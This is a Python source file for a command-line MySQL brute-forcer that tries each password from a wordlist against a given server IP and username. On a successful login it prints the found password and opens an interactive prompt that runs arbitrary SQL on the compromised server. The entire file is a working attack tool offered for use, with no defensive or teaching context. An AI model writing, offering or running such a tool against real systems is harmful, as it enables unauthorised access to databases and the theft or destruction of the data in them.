import argparse
import mysql.connector
from colorama import Fore, Style, init
import time

# Initialize colorama
init(autoreset=True)

# Function to handle connection and brute-force
def brute_force_sql(username, password_list, target_ip):
    try:
        for password in password_list:
            print(Fore.YELLOW + f"Trying Passphrase: {password}")
            try:
                # Establish connection
                connection = mysql.connector.connect(
                    host=target_ip,
                    user=username,
                    password=password
                )
                # If successful connection, print key found
                print(Fore.GREEN + f"KEY FOUND: [\"{password}\"]")
                
                # Execute commands after successful connection
                while True:
                    command = input(Fore.CYAN + "Enter SQL command (or type 'exit' to quit): ")
                    if command.lower() == 'exit':
                        break
                    cursor = connection.cursor()
                    cursor.execute(command)
                    result = cursor.fetchall()
                    for row in result:
                        print(row)
                    cursor.close()

                connection.close()
                break  # Stop brute-forcing once the correct password is found
            except mysql.connector.Error as err:
                print(Fore.RED + f"Failed to connect with password {password}: {err}")
        else:
            print(Fore.RED + "KEY NOT FOUND")
    
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")

# Main function for argument parsing
def main():
    parser = argparse.ArgumentParser(description="SQL Brute-Forcer")
    parser.add_argument('-l', '--username', required=True, help="Username for SQL login")
    parser.add_argument('-P', '--passwordlist', required=True, help="Path to the password list file")
    parser.add_argument('target', help="Target SQL Server IP")

    args = parser.parse_args()

    # Read the password list from file
    try:
        with open(args.passwordlist, 'r') as file:
            password_list = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(Fore.RED + "Password list file not found.")
        return

    # Start brute-forcing
    brute_force_sql(args.username, password_list, args.target)

if __name__ == '__main__':
    main()
